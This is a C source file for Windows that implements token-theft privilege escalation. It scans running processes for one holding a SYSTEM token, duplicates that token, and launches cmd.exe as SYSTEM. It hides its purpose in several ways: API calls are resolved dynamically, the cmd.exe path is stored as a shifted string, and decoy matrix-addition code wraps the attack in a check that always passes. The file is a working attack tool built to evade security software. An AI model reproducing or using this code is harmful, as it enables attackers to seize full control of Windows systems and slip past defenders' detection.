#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <Shlobj.h>
#include <time.h>
#include <string.h>
#include <math.h>

#define ERROR_CREATE_SNAPSHOT "CreateToolhelp32Snapshot failed with error %lu\n"
#define ERROR_PROCESS_FIRST "Process32First failed with error %lu\n"
#define ERROR_LAUNCH_PROCESS "Failed to create a process with the impersonated token. Error: %lu\n"
#define ERROR_DUPLICATE_TOKEN "Failed to duplicate the SYSTEM token. Error: %lu\n"
#define ERROR_GET_SYSTEM_TOKEN "Failed to get SYSTEM token.\n"

#define MIN_DIM 2
#define MAX_DIM 5
#define MIN_VAL 1
#define MAX_VAL 10

void LogError(const char* errorMessage, DWORD lastError);
BOOL LoadDynamicFunctions();
BOOL IsSystemToken(HANDLE hToken);
BOOL GetSystemToken(HANDLE* phToken);
BOOL DuplicateSystemToken(HANDLE hToken, HANDLE* phNewToken);
BOOL LaunchProcessWithToken(HANDLE hToken, LPCWSTR lpApplicationName);
void fillMatrixWithRandomValues(int** mat, int rows, int cols, int min_val, int max_val);
void addMatrices(int** mat1, int** mat2, int** result, int rows, int cols);
int** allocateMatrix(int rows, int cols);
void freeMatrix(int** mat, int rows);
void shift(char* input, char* output, int size);

typedef HANDLE(WINAPI* PFN_CREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
PFN_CREATETOOLHELP32SNAPSHOT dynamicCreateToolhelp32Snapshot = NULL;
typedef HANDLE(WINAPI* PFN_OPENPROCESS)(DWORD, BOOL, DWORD);
PFN_OPENPROCESS dynamicOpenProcess = NULL;
typedef BOOL(WINAPI* PFN_OPENPROCESSTOKEN)(HANDLE, DWORD, PHANDLE);
PFN_OPENPROCESSTOKEN dynamicOpenProcessToken = NULL;
typedef int (WINAPI* PFN_MultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
PFN_MultiByteToWideChar dynamicMultiByteToWideChar = NULL;
typedef BOOL(WINAPI* PFN_DUPLICATETOKENEX)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
PFN_DUPLICATETOKENEX dynamicDuplicateTokenEx = NULL;

void LogError(const char* errorMessage, DWORD lastError) {
    fprintf(stderr, errorMessage, lastError);
}

BOOL LoadDynamicFunctions() {
    HMODULE hKernel32 = LoadLibrary(TEXT("kernel32.dll"));
    HMODULE hAdvapi32 = LoadLibrary(TEXT("advapi32.dll"));

    if (!hKernel32 || !hAdvapi32) {
        fprintf(stderr, "Failed to load one or more DLLs.\n");
        if (hKernel32) FreeLibrary(hKernel32);
        if (hAdvapi32) FreeLibrary(hAdvapi32);
        return FALSE;
    }

    dynamicCreateToolhelp32Snapshot = (PFN_CREATETOOLHELP32SNAPSHOT)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    dynamicOpenProcess = (PFN_OPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
    dynamicOpenProcessToken = (PFN_OPENPROCESSTOKEN)GetProcAddress(hAdvapi32, "OpenProcessToken");
    dynamicMultiByteToWideChar = (PFN_MultiByteToWideChar)GetProcAddress(hKernel32, "MultiByteToWideChar");
    dynamicDuplicateTokenEx = (PFN_DUPLICATETOKENEX)GetProcAddress(hAdvapi32, "DuplicateTokenEx");

    if (!dynamicCreateToolhelp32Snapshot || !dynamicOpenProcess || !dynamicOpenProcessToken || !dynamicMultiByteToWideChar || !dynamicDuplicateTokenEx) {
        fprintf(stderr, "Failed to load one or more functions.\n");
        FreeLibrary(hKernel32);
        FreeLibrary(hAdvapi32);
        return FALSE;
    }

    return TRUE;
}

BOOL IsSystemToken(HANDLE hToken) {
    BOOL isSystem = FALSE;
    DWORD neededSize;
    PTOKEN_USER pTokenUser = NULL;

    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &neededSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        pTokenUser = (PTOKEN_USER)malloc(neededSize);
        if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, neededSize, &neededSize)) {
            SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
            PSID pSystemSid;
            if (AllocateAndInitializeSid(&SIDAuthNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
                if (EqualSid(pTokenUser->User.Sid, pSystemSid)) {
                    isSystem = TRUE;
                }
                FreeSid(pSystemSid);
            }
        }
        if (pTokenUser) {
            free(pTokenUser);
        }
    }
    return isSystem;
}

BOOL GetSystemToken(HANDLE* phToken) {
    HANDLE hSnapshot = dynamicCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LogError(ERROR_CREATE_SNAPSHOT, GetLastError());
        return FALSE;
    }

    BOOL bResult = FALSE;
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    if (Process32First(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = dynamicOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                HANDLE hToken;
                if (dynamicOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                    if (IsSystemToken(hToken)) {
                        *phToken = hToken;
                        bResult = TRUE;
                        break;
                    }
                    else {
                        CloseHandle(hToken);
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnapshot, &pe32) && !bResult);
    }
    else {
        LogError(ERROR_PROCESS_FIRST, GetLastError());
    }

    CloseHandle(hSnapshot);
    return bResult;
}

BOOL DuplicateSystemToken(HANDLE hToken, HANDLE* phNewToken) {
    return dynamicDuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, phNewToken);
}

BOOL LaunchProcessWithToken(HANDLE hToken, LPCWSTR lpApplicationName) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    BOOL result = CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, lpApplicationName, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (!result) {
        LogError(ERROR_LAUNCH_PROCESS, GetLastError());
    }
    else {
        printf("Successfully launched a new process with SYSTEM privileges.\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return result;
}

void fillMatrixWithRandomValues(int** mat, int rows, int cols, int min_val, int max_val) {
    for (int i = 0; i < rows; i++) {
        for (int j = 0; j < cols; j++) {
            mat[i][j] = min_val + rand() % (max_val - min_val + 1);
        }
    }
}

void addMatrices(int** mat1, int** mat2, int** result, int rows, int cols) {
    for (int i = 0; i < rows; i++) {
        for (int j = 0; j < cols; j++) {
            result[i][j] = mat1[i][j] + mat2[i][j];
        }
    }
}

int** allocateMatrix(int rows, int cols) {
    int** mat = (int**)malloc(rows * sizeof(int*));
    if (mat == NULL) {
        fprintf(stderr, "Memory allocation error for matrix rows.\n");
        return NULL;
    }

    for (int i = 0; i < rows; i++) {
        mat[i] = (int*)malloc(cols * sizeof(int));
        if (mat[i] == NULL) {
            fprintf(stderr, "Memory allocation error for a row in the matrix.\n");
            for (int j = 0; j < i; j++) {
                free(mat[j]);
            }
            free(mat);
            return NULL;
        }
    }
    return mat;
}

void freeMatrix(int** mat, int rows) {
    for (int i = 0; i < rows; i++) {
        free(mat[i]);
    }
    free(mat);
}

void shift(char* input, char* output, int size) {
    for (int i = 0; i < size; i++) {
        output[i] = input[i] - 1;
    }
    output[size] = '\0';
}

int main(int argc, char* argv[]) {

    srand((unsigned int)time(NULL));

    int rows = MIN_DIM + rand() % (MAX_DIM - MIN_DIM + 1);
    int cols = MIN_DIM + rand() % (MAX_DIM - MIN_DIM + 1);

    int** mat1 = allocateMatrix(rows, cols);
    int** mat2 = allocateMatrix(rows, cols);
    int** result = allocateMatrix(rows, cols);


    if (mat1 == NULL || mat2 == NULL || result == NULL) {
        if (mat1) freeMatrix(mat1, rows);
        if (mat2) freeMatrix(mat2, rows);
        if (result) freeMatrix(result, rows);
        return 1;
    }

    fillMatrixWithRandomValues(mat1, rows, cols, MIN_VAL, MAX_VAL);
    fillMatrixWithRandomValues(mat2, rows, cols, MIN_VAL, MAX_VAL);

    addMatrices(mat1, mat2, result, rows, cols);

    int sum = 0;
    for (int i = 0; i < rows; i++)
        for (int j = 0; j < cols; j++)
            sum += result[i][j];

    int expectedMin = 2 * MIN_VAL * rows * cols;
    int expectedMax = 2 * MAX_VAL * rows * cols;

    if (sum >= expectedMin && sum <= expectedMax) {

        if (!LoadDynamicFunctions()) {
            fprintf(stderr, "Failed to load functions dynamically.\n");
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }

        BOOL isAdmin = IsUserAnAdmin();
        if (!isAdmin) {
            fprintf(stderr, "This program needs to be run as an administrator.\n");
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }

        HANDLE hToken, hNewToken;

        if (!GetSystemToken(&hToken)) {
            LogError(ERROR_GET_SYSTEM_TOKEN, GetLastError());
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }

        if (!DuplicateSystemToken(hToken, &hNewToken)) {
            LogError(ERROR_DUPLICATE_TOKEN, GetLastError());
            CloseHandle(hToken);
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }

        CloseHandle(hToken);

        char shiftPath[] = "D;]]Xjoepxt]]Tztufn43]]dne/fyf";
        int len = strlen(shiftPath);

        char* unshiftPath = malloc(len + 1);
        if (unshiftPath == NULL) {
            fprintf(stderr, "Erreur d'allocation mémoire.\n");
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }

        shift(shiftPath, unshiftPath, len);

        int wLen = dynamicMultiByteToWideChar(CP_UTF8, 0, unshiftPath, -1, NULL, 0);
        wchar_t* wPath = malloc(wLen * sizeof(wchar_t));
        if (wPath == NULL) {
            fprintf(stderr, "Memory allocation error for wPath.\n");
            free(unshiftPath);
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }
        dynamicMultiByteToWideChar(CP_UTF8, 0, unshiftPath, -1, wPath, wLen);

        if (!LaunchProcessWithToken(hNewToken, wPath)) {
            fprintf(stderr, "LaunchProcessWithToken fails.\n");
            CloseHandle(hNewToken);
            free(wPath);
            free(unshiftPath);
            freeMatrix(mat1, rows);
            freeMatrix(mat2, rows);
            freeMatrix(result, rows);
            return 1;
        }

    }
    else {
        printf("The result is not within the expected range.\n");
    }

    freeMatrix(mat1, rows);
    freeMatrix(mat2, rows);
    freeMatrix(result, rows);
}
